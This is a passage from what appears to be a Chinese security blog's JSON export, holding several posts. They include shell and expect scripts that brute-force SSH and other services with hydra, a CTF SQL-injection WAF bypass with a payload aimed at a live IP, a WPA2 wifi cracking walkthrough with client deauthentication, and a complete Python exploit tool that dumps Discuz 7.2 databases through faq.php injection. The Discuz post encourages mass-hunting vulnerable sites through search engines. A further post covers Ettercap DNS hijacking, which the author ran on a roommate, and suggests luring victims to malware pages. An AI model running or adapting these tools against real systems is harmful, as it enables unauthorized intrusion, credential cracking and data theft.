&quot;*assword:&quot; { send &quot;$password\\n&quot; } } &quot;*assword:&quot; { send &quot;$password\\n&quot; } } expect &quot;100%&quot; expect eof: excute.exp：ssh登陆指定ip执行之前上传的基线脚本，并且将运行结果的文件发送回来 #!/usr/bin/expect -f set ip [lindex $argv 0 ] set password [lindex $argv 1 ] set timeout 10 spawn ssh root@$ip expect { &quot;*yes/no&quot; { send &quot;yes\\r&quot;; exp_continue} &quot;*password:&quot; { send &quot;$password\\r&quot; } } expect { &quot;#*&quot; { send &quot;pwd\\r cd /tmp/\\r ./66c221be-6ab2-ef53-1589-fe16877914f4.sh $ip\\r&quot; } } spawn scp root@$ip:/tmp/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml /root/autocheck/report/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml expect { &quot;(yes/no)?&quot; { send &quot;yes\\n&quot; expect &quot;*assword:&quot; { send &quot;$password\\n&quot; } } &quot;*assword:&quot; { send &quot;$password\\n&quot; } } expect eof exit ip.list：存放需要检查的ip列表 autocheck.sh：读取ip列表，检查存活的主机，过滤出开放22端口的主机ip，调用之前写的两个脚本去自动传送基线检查脚本执行并且将结果返回回来 #!/bin/bash for ip in `cat ip.list` do newip=`nmap -Pn -sS -p 22 $ip|grep &quot;open&quot; -B4|awk &apos;/Nmap scan/{print $5}&apos;` hydra -l root -p 123456 $newip ssh|grep &quot;password:&quot; if [ $? == 0 ] then ./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; ./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; ./excute.exp $newip &quot;123456&quot; else continue fi done 执行./autocheck.sh后的结果可以看到report目录下就是返回来的文件，里面存放着linux基线扫描的结果 还可以改进的地方，这个脚本用户名密码写死了，可以再加一个用户名密码文件，读取用户名密码登录，然后检查，这样会更有实际意义，自己会不断完善功能，希望在以后的实习中可以直接用到。","categories":[{"name":"Linux Shell","slug":"Linux-Shell","permalink":"http://yoursite.com/categories/Linux-Shell/"}],"tags":[{"name":"Linux Shell","slug":"Linux-Shell","permalink":"http://yoursite.com/tags/Linux-Shell/"}]},{"title":"用shell实现自动化扫描主机端口爆破服务弱口令","slug":"autobrute","date":"2018-05-14T08:36:34.456Z","updated":"2018-06-04T14:55:53.893Z","comments":true,"path":"2018/05/14/autobrute/","link":"","permalink":"http://yoursite.com/2018/05/14/autobrute/","excerpt":"用shell实现自动化扫描主机端口爆破服务弱口令最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间","text":"用shell实现自动化扫描主机端口爆破服务弱口令最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间 需求假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令 一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率 编写shell脚本我编写的shell脚本有以下几部分组成 ip.txt ip列表，里面放着要扫描的ip service.conf 配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务 比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：端口：服务 22:ssh 3306:mysql 这样便能灵活的对我们需要的服务进行弱口令检测 user.txt 存放着常见的用户名，用于hydra爆破 passwd.txt 存放着常见的弱口令，用于hydra爆破 brute.sh 下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作 #!/bin/bash filename=$1 for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf` do name=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf` echo &quot;$name weak password result:&quot; nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txt nmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txt if [ ! -s tmpip.txt ] then echo &quot;no ip open port $port&quot; else result=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;` echo $result fi done 首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查 脚本运行结果，以自己所在内网的ip作为测试，ip段192.168.3.0/24,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令 这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本","categories":[{"name":"Linux Shell","slug":"Linux-Shell","permalink":"http://yoursite.com/categories/Linux-Shell/"}],"tags":[{"name":"Linux Shell","slug":"Linux-Shell","permalink":"http://yoursite.com/tags/Linux-Shell/"}]},{"title":"php parse_url()函数的漏洞","slug":"parse_url","date":"2018-05-13T10:11:57.382Z","updated":"2018-06-04T15:10:21.808Z","comments":true,"path":"2018/05/13/parse_url/","link":"","permalink":"http://yoursite.com/2018/05/13/parse_url/","excerpt":"php parse_url()函数的漏洞在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤","text":"php parse_url()函数的漏洞在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤来看代码 &lt;?php $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); var_dump($query); ?&gt; 访问url：http://127.0.0.1/info/parseurl.php?sql=select 这里会是url中正常的参数值 如果访问url:http://127.0.0.1///info/parseurl.php?sql=select这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤 来看一道ctf题 http://118.126.113.78/web1/?id=1 已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的利用php伪协议文件包含读取waf.php的源代码 http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJEtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg== base64解码后 &lt;?php error_reporting(0); $_GET=Add_S($_GET); $_POST=Add_S($_POST); $_COOKIE=Add_S($_COOKIE); $_REQUEST=Add_S($_REQUEST); function Add_S($array) { foreach($array as $key=&gt;$value){ if(!is_array($value)){ $check= preg_match(&apos;/regexp|and|like|\\&quot;|%|insert|update|delete|union|into|load_file|outfile|\\/\\*/i&apos;, $value); if($check) { exit(&quot;Hacker!&quot;); } }else{ $array[$key]=Add_S($array[$key]); } } return $array; } function Measurement_url() { $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;); foreach($query as $key) { foreach($Keyword as $value) { if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key))) { die(&quot;fuck u!&quot;); } } } } ?&gt; 可以看到其实是写了两个函数分别过滤的，其中ADD_S函数确实是将其里面定义的黑名单sql关键字过滤死了，但是Measurement_url函数中接收url参数值确是通过的parse_url这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有ADD_S中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过parse_url函数的漏洞去绕过黑名单的检查，最终读取flag的payload http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+ （对select，from的过滤就可以通过parse_url这个函数的漏洞绕过） XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;","categories":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"kali无线网卡wifi破解","slug":"wificrack","date":"2018-04-19T10:47:50.538Z","updated":"2018-06-04T15:14:43.532Z","comments":true,"path":"2018/04/19/wificrack/","link":"","permalink":"http://yoursite.com/2018/04/19/wificrack/","excerpt":"kali无线网卡wifi破解准备环境1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中 2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的","text":"kali无线网卡wifi破解准备环境1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中 2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的 攻击步骤1.将usb无线网卡连入虚拟机2.查看无线网卡wlan0是否存在 iwconfig 3.开启无线网卡的侦听功能 airmon-ng start wlan0 如果出现无法侦听数据，先kill一下进程再重新启动一下无线网卡 airmon-ng check kill airmon-ng start wlan0 4.iwconfig再次查看网卡，看到无线网卡已经变为了wlan0mon，说明无线网卡开启了监听功能5.使用无线网卡侦听附近的wifi信号 airodump-ng wlan0mon 比较重要的几个值，BSSID代表无线网络的唯一标识，也就是路由的MAC地址，CH代表wifi信道，我们攻击的wifi选择了我们实验室的wifi:secevery，可以看到信号还是不错的6.选择要破解的wifi并且抓取握手包 airodump-ng -c 信道 --bssid BSSID -w 保存文件 wlan0mon 在这里我们要攻击的BSSID为B0:E1:7E:7D:EA:CC，信道为1 airodump-ng -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon STATION为wifi下所有设备的MAC地址7.如果抓不到握手包，就要模拟station，模拟其断开，就是踢掉相应的设备，使其重连再抓握手包，10表示发送10个包 airepaly-ng -0 10 -a BSSID -c 你要踢掉的设备的MAC地址 wlan0mon如果出现红框里的内容，说明抓到握手包ls查看可以看到已经抓到握手包 8.进行wifi破解，破解成功 aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap 其中a2代表wifi的加密协议为WPA2","categories":[{"name":"无线安全","slug":"无线安全","permalink":"http://yoursite.com/categories/无线安全/"}],"tags":[{"name":"wifi破解","slug":"wifi破解","permalink":"http://yoursite.com/tags/wifi破解/"}]},{"title":"python爬取补天src列表","slug":"butianspider","date":"2018-04-17T09:28:12.804Z","updated":"2018-06-04T17:21:52.523Z","comments":true,"path":"2018/04/17/butianspider/","link":"","permalink":"http://yoursite.com/2018/04/17/butianspider/","excerpt":"用python爬取补天src列表分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码","text":"用python爬取补天src列表分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码 # -*- coding: utf-8 -*- import requests from bs4 import BeautifulSoup url=&quot;http://loudong.360.cn/Reward/pub&quot; for pnum in range(1,160): r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json() for info in r[&quot;data&quot;][&quot;list&quot;]: company_name=info[&quot;company_name&quot;] company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;] html=requests.get(url=company_url).content soup=BeautifulSoup(html,&quot;lxml&quot;) num=soup.find_all(class_=&quot;spp&quot;) print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;] headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;} html=requests.get(url=surl,headers=headers).content soup=BeautifulSoup(html,&quot;lxml&quot;) site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;] print company_name print site print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string print &quot;-------------------------------------------------------------------------------------------------&quot; 爬取时需要用到的库 requests库和bs4库 补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可 关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，官方文档写的非常详细 运行结果 分享我写爬虫的一些经验最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法 request库常用总结 html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content 用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交 参数作用: params:字典数据类型，存放http请求的GET参数 headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面 cookies:字典数据类型,用来存放cookie值 proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口: proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;} html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content 用于http POST方法请求的页面 data:字典数据类型，POST提交的参数 headers，cookie，proxies:均和上述的作用一致 re库常用总结 p=re.compile(r&quot;编写的正则表达式&quot;) 用来编译正则表达式对象并且返回一个正则表达式对象 list=p.findall(页面) 匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回 关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+) bs4库的BeautifulSoup常用总结 使用BeautifulSoup提取数据，首先要了解html DOM格式: 简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt; from bs4 import BeautifulSoup soup=BeautifulSoup(html,&quot;lxml&quot;) 返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了 list=soup.find_all(html标签属性=属性值) 寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象 for i in list: i[&quot;属性&quot;]用来提取某一属性下的属性值 i.string用来提取html标签中的文本 urllib库常用总结 urllib.urlretrieve(url,filename) urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载 url:资源的链接 filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便 我对写爬虫的看法以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大 python爬虫能力对安全人员的作用开发简单的漏扫工具，需要爬虫的基础 根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞 利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成 贴出我很久之前学习python时利用python编写的一个自动化利用漏洞的工具代码，选择的漏洞为discuz7.2 faq.php注入漏洞，实现了类似sqlmap的命令行操作 #coding=utf-8 import requests import re import sys from optparse import OptionParser from threading import Thread def main(): parser=OptionParser() parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;&quot;) parser.add_option(&quot;-r&quot;,type=&quot;string&quot;,dest=&quot;filename&quot;,help=&quot;&quot;) parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;&quot;) parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;&quot;) parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;&quot;) parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;&quot;) parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;&quot;) parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;&quot;) parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;&quot;) (options,args)=parser.parse_args() if options.url and len(sys.argv)==3: url=options.url result=testurl(url) if result: getinfo(url) else: pass elif options.url and options.dbs:#--dbs url=options.url getdbs(url) elif options.url and options.tables and options.db:#-u url --tables -D database url=options.url db=options.db gettables(url,db) elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database url=options.url table=options.table db=options.db getcolumns(url,table,db) elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump -C column -T table -D database url=options.url column=options.column table=options.table db=options.db dumpdata(url,column,table,db) elif options.filename: filename=options.filename testurllist(filename) def testurl(url): payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;You have an error in your SQL syntax&quot;) if re.findall(p,str): print &quot;this url injectable!&quot; return True else: print &quot;this url not injectable&quot; return False def testurllist(filename): try: file=open(filename,&quot;r&quot;) urllist=[url.strip() for url in file.readlines()] for url in urllist: print &quot;test url..............%s&quot;%(url) testurl(url) except IOError,e: print &quot;file open error&quot;,e def getinfo(url): payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select database()),0x3a)x from information_schema.tables group by x)a)#&apos;} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) c_db=re.findall(p,str).pop() payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select user()),0x3a)x from information_schema.tables group by x)a)#&apos;} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) user=re.findall(p,str).pop() payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select version()),0x3a)x from information_schema.tables group by x)a)#&apos;} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) version=re.findall(p,str).pop() print &quot;current database:%s\\nuser:%s\\nversion:%s\\n&quot;%(c_db,user,version) def getdbs(url): i=0 while 1: payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select schema_name from information_schema.schemata limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(i)} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) dbs=re.findall(p,str) if dbs==[]: break else: print dbs[-1] i=i+1 def gettables(url,db): print &quot;select database:%s&quot;%(db) hexdb=&apos;0x&apos;+db.encode(&quot;hex&quot;) i=0 while 1: payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select table_name from information_schema.tables where table_schema=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hexdb,i)} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) table=re.findall(p,str) if table==[]: break else: print table[-1] i=i+1 def getcolumns(url,table,db): print &quot;select database:%s\\nselect table:%s&quot;%(db,table) hextables=[] hextables.append(&quot;0x&quot;+table.encode(&quot;hex&quot;)) hextables.append(&quot;0x&quot;+(&quot;cdb_&quot;+table).encode(&quot;hex&quot;)) if table.find(&quot;uc_&quot;)==0: hextables.append(&quot;0x&quot;+(table.split(&quot;_&quot;)[1]).encode(&quot;hex&quot;)) print hextables for hextable in hextables: i=0 while 1: payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select column_name from information_schema.columns where table_name=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hextable,i)} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) column=re.findall(p,str) if column==[]: break else: print column[-1] i=i+1 print i def dumpdata(url,column,table,db): print &quot;select database:%s\\nselect table:%s\\nselect column:%s&quot;%(db,table,column) column=column.replace(&quot;,&quot;,&quot;,0x3a,&quot;) tables=[] tables.append(table) tables.append(&quot;cdb_&quot;+table) if table.find(&quot;uc_&quot;)&gt;=0: tables.append(table.split(&quot;_&quot;)[1]) print tables for table in tables: i=0 while 1: payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select concat(%s) from %s.%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(column,db,table,i)} content=requests.get(url=url,params=payload) str=content.text p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;) data=re.findall(p,str) if data==[]: break else: print data[-1] i=i+1 if __name__==&quot;__main__&quot;: main() 官方文档链接BeautifulSoup官方文档 requests官方文档","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Ettercap实现局域网dns劫持","slug":"dns_spoof","date":"2018-03-21T15:43:32.584Z","updated":"2018-06-04T14:58:07.193Z","comments":true,"path":"2018/03/21/dns_spoof/","link":"","permalink":"http://yoursite.com/2018/03/21/dns_spoof/","excerpt":"Ettercap实现局域网dns劫持百度序很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验","text":"Ettercap实现局域网dns劫持百度序很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验 环境准备1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中，连接自己的RT3070的无线网卡（网卡一定要是kali2.0支持的型号），同时开启apache服务，进行dns劫持 2.自己的真实机，连接本机电脑的无线网卡 3.RT3070网卡和本机电脑网卡连接同一wifi，保证kali和自己的PC在同一局域网，用kali对自己的PC进行DNS缓存投毒 4.用到的软件:kali中的Ettercap，一个集成工具，里面包括了局域网主机扫描，arp欺骗，DNS劫持等功能 5.浏览器:谷歌浏览器 原理DNS，全称为域名解析协议，是一种将域名解析为ip地址的协议，基于UDP的53端口。比如我们在浏览器访问百度域名，会先向dns服务器发送一次dns请求报文，询问百度的ip地址，dns服务器经过查询（或递归查询）会将百度的域名以及对应的ip地址以dns响应报文的形式发回给我们，然后我们才可以与所对应的ip建立TCP连接进行网络通信。dns劫持建立在arp欺骗的基础上，关于arp的文章之前有写过，链接：arp协议分析&amp;python编程实现arp欺骗抓图片，通过arp欺骗可以监听受害者机器到网关之间的流量，如果可以过滤协议为UDP，端口为53端口的数据报文，也就是DNS报文，并且将dns响应中的域名所对应的ip地址改写成我们服务器的ip，受害者机器就会与我们的机器进行连接通信，这就是dns投毒的基本原理，kali的Ettercap就可以做到这一点，当然明白了攻击原理，自己编程实现也是可以的，python的scapy库便可以做到，之后有时间会尝试写一下 具体操作1.开启ip转发功能，默认是关闭的 echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward 2.查看kali的ip为192.168.0.106，并且修改Ettercap的配置文件，添加一条dns解析记录（A记录） * A 192.168.0.106 意思是将所有域名都解析到我们kali的ip上 3.service apache2 start开启apache服务,并在/var/www/html下新建index.html,就是我们攻击后想要看到的效果页面，自己简单写了个有意思的页面，效果如下4.准备工作都做好了，接下来使用Ettercap开始我们的攻击,启动Ettercap图形界面 ettercap -G 点击Sniff–&gt;Unified sniffing在这选择wlan0无线网卡，因为kali上网使用的是无线网卡，如果虚拟机插网线桥接，这里选eth0接下来点击Hosts–&gt;Scan for hosts,扫描局域网中存活的ip，寻找攻击目标显示扫到5个主机，点击Hosts list查看在ip列表里可以看到网关ip192.168.0.1，还有我们的物理机ip192.168.0.103，接下来开始arp欺骗，具体操作将192.168.0.1Add to Target1，将受害PCip192.168.0.103Add to Target2，然后点击Mitm–&gt;ARP poisoning勾选第一个ARP欺骗便开始了下面开始dns劫持，点击Plugins–&gt;Manage the plugins选择dns_spood插件，便开始dns欺骗了我们这时访问百度，就会看到dns已经被劫持，嘿嘿嘿同时欺骗了室友的电脑和手机也成功，差点没被打死。。。。就是皮 最后说一下，dns劫持这种攻击不仅限于恶作剧，利用这种攻击，我们还可以诱导受害者进入我们构造的恶意软件下载页面，下载恶意软件以让我们对对方的电脑做一些事情 老铁们遇到dns劫持这种恶作剧，打开cmd命令行输入 ipconfig /flushdns 刷新dns缓存即可，然后找到那个皮的人。。。","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/categories/内网渗透/"}],"tags":[{"name":"dns劫持","slug":"dns劫持","permalink":"http://yoursite.com/tags/dns劫持/"}]},{"title":"解决kali执行apt update时报错","slug":"kali update error","date":"2018-03-19T15:27:48.136Z","updated":"2018-06-04T15:03:50.366Z","comments":true,"path":"2018/03/19/kali update error/","link":"","permalink":"http://yoursite.com/2018/03/19/kali update error/","excerpt":"解决kali执行apt update时报错","text":"解决kali执行apt update时报错 更新kali时在执行apt update遇到如下错误 Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB] Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt; Reading package lists... Done Building dependency tree Reading state information... Done 945 packages can be upgraded. 